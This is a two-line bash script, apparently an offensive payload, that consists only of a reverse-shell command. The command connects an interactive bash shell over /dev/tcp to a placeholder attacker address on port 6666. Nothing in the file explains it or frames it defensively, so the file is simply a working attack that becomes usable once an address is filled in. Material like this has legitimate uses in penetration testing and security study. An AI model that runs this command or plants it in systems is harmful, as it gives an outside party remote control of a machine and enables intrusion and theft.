#!/bin/bash

bash -i >& /dev/tcp/<ip>/6666 0>&1

